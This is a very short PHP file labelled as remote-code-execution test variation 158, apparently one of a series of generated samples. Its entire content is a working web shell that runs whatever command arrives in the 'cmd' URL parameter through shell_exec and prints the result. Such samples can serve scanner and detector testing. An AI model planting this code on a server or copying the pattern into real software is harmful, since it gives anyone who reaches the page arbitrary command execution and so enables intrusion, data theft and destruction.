<?php
// RCE test variation #158
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>